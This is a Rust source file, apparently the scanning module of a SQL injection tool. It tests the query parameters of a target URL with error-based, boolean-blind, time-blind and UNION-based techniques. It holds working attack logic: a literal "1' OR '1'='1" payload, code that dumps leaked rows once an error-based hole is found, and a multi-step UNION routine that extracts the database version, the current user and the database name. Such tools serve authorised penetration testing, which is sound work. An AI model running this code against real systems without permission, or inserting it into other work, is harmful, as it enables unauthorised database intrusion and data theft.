use crate::http;
use crate::payloads;
//use anyhow::Ok;
use colored::Colorize;
use url::Url;




pub fn scan(target_url: &str, cookie: Option<&str>, scan_type: &str) -> anyhow::Result<()>{

    let parsed = Url::parse(target_url)?;
    let  params: Vec<(String, String)> = parsed
        .query_pairs()
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .collect();
    if params.is_empty(){
        println!("No query  parameters found. Nothing to inject.");
        return Ok(());
    }

    println!("Found {} Injectable parameters", params.len());


    let baseline = http::get(target_url, cookie)?;
    println!("Baseline: status= {}, body_len={}, time={}ms", baseline.status, baseline.body.len(), baseline.response_time_ms);
    
    let run_error = scan_type == "error" || scan_type == "all";
    let run_boolean = scan_type == "boolean" || scan_type == "all";
    let run_time = scan_type == "time" || scan_type == "all";
    let run_union = scan_type == "union" || scan_type == "all";
    
    for (param_name, _original_value) in &params {
        println!("\n--- Testing Param: {} ---", param_name);
        if run_error {
                let mut error_found = false;
                for payload in payloads::error_based()  {
                let injected_url = replace_param(target_url, param_name, payload)?;
                let res = http::get(&injected_url, cookie)?;
         
                if let Some(db) = super::detector::detect_error_based(&res.body) {

                    let finding = super::detector::Finding{
                        sqli_type: "Error-based".to_string(),
                        param: param_name.clone(),
                        db_type: Some(db),
                        payload: payload.to_string(),
                        evidence: format!("SQL error in response body")
                    };
                    
                    println!("{}", finding);

                    let extract_url = replace_param(target_url, param_name, "1' OR '1'='1")?;
                    let extract_res = http::get(&extract_url, cookie)?;
                    let data = super::detector::extract_data(&extract_res.body);
                    if !data.is_empty() {
                        println!("\n Leaked data: {} rows:", data.len());
                        for row in &data  {
                            println!("      {}", row);
                        }
                    }
                    error_found = true;
                    break;
                }
            }
            if !error_found {
                println!("  Error-based: not detected");
            }
        }
        if run_boolean {
            let mut bool_found = false;
            for (true_payload, false_payload) in payloads::boolean_blind()  {
                let true_url = replace_param(target_url, param_name, true_payload)?;
                let false_url = replace_param(target_url, param_name, false_payload)?;
                let true_res = http::get(&true_url, cookie)?;
                let false_res = http::get(&false_url, cookie)?;
        
                if super::detector::detect_boolean_blind(baseline.body.len(), &true_res.body, &false_res.body) {

                    let finding = super::detector::Finding{
                        sqli_type: "Boolean-Blind".to_string(),
                        param: param_name.clone(),
                        db_type: None,
                        payload: true_payload.to_string(),
                        evidence: format!("TRUE: {} | False: {} | Diff: {}", true_res.body.len(),false_res.body.len(),(true_res.body.len() as isize - false_res.body.len() as isize).abs())
                    };
                    println!("{}", finding);
                    bool_found = true;
                    break;
                }
            }
            if !bool_found {
                let msg = "  Boolean-Blind: not detected".dimmed();
                println!("{}", msg);
            }
        }
        if run_time {
            let mut time_found = false;
            for (payload, db_type) in payloads::time_blind()  {
                let injected_url = replace_param(target_url, param_name, payload)?;
                let res = http::get(&injected_url, cookie)?;
            
                if super::detector::detect_time_blind(baseline.response_time_ms, res.response_time_ms, 4000) {
                    
                    let finding = super::detector::Finding{
                        sqli_type: "Time-Blind".to_string(),
                        param: param_name.clone(),
                        db_type: Some(db_type.to_string()),
                        payload: payload.to_string(),
                        evidence: format!("Baseline: {}ms | Injected: {}ms | Delta: {}ms", baseline.response_time_ms, res.response_time_ms, res.response_time_ms - baseline.response_time_ms),
                    };
                    println!("{}", finding);
                    time_found = true;
                    break;
                }
            }
            if !time_found {
                println!("  Time-Blind: not detected");
            }
        }
        if run_union {
            probe_union(target_url, param_name, cookie)?;
        }
    }
    let msg_finish = "\n============= Scan Complete =============".blue().bold();
    println!("{}", msg_finish);
    Ok(())
}


fn probe_union(target_url: &str, param_name: &str, cookie: Option<&str>) -> anyhow::Result<()> {
    let msg_step1 = "  [UNION] step 1: Finding column count...".cyan().dimmed();
    println!("{}", msg_step1);

    let mut col_count: u32 = 0;
    for n in 1..=20  {
        let payload = payloads::union_order_by(n);
        let url = replace_param(target_url, param_name, &payload)?;
        let res = http::get(&url, cookie)?;

        if super::detector::detect_error_based(&res.body).is_some() 
            || res.body.len() < 100
        {
            col_count = n - 1;
            break;
        }
    }

    if col_count == 0 {
        let det_col = "  [UNION] Could not  determine column count".dimmed();
        println!("{}", det_col);
        return Ok(());
    }
    println!("  [UNION] Column count: {}", col_count.to_string().cyan().bold());
    
    let msg_step2 = "  [UNION] Step 2: Finding reflection column...".cyan().dimmed();
    println!("{}", msg_step2);
    let mut reflection_col: Option<u32> = None;
    for pos in 0..col_count  {
        let payload = payloads::union_find_reflection(col_count, pos);
        let url = replace_param(target_url, param_name, &payload)?;
        let res = http::get(&url, cookie)?;

        if res.body.contains("sqli_test") {
            reflection_col = Some(pos);
            break;
        }
    }

    let reflect_pos = match reflection_col {
        Some(pos) => {
            println!("  [UNION] Reflection found at column: {}", (pos + 1).to_string().cyan().bold());
            pos
        }
        None => {
            let msg = "  [UNION] No reflection column found ".dimmed();
            println!("{}", msg);
            return Ok(());
        }
    };
    let msg_step3 = "  [UNION] Step 3: Extracting data...\n".cyan().dimmed();
    println!("{}", msg_step3);

    let extractions = vec![
        ("version()", "DB version"),
        ("user()", "Current User"),
        ("database()", "Database Name"),
    ];

    for (expr, label) in extractions  {
        let payload = payloads::union_extract(col_count, reflect_pos, expr);
        let url = replace_param(target_url, param_name, &payload)?;
        let res = http::get(&url, cookie)?;

        if let Some(value) = super::detector::extract_value(&res.body) {
            println!("  {}: {}", label.yellow().bold(), value.green());
        }

    }

    println!();
    let union_finding = super::detector::Finding{
        sqli_type: "UNION-Based".to_string(),
        param: param_name.to_string(),
        db_type: None,
        payload: "(Multi-step)".to_string(),
        evidence: format!("columns: {}", col_count),
    };

    println!("{}", union_finding);
    Ok(())

}

fn replace_param(url_str: &str, param: &str, payload: &str) -> anyhow::Result<String>{
    let mut parsed = Url::parse(url_str)?;
    let new_query: Vec<(String, String)> = parsed
    .query_pairs() 
    .map(|(k, v)| {
        if k == param {
            (k.to_string(), payload.to_string())
        }else {
            (k.to_string(), v.to_string())
        }
    })
    .collect();

    parsed.query_pairs_mut().clear();
    for (k, v) in &new_query {
        parsed.query_pairs_mut().append_pair(k, v);
    }

    Ok(parsed.to_string())
}

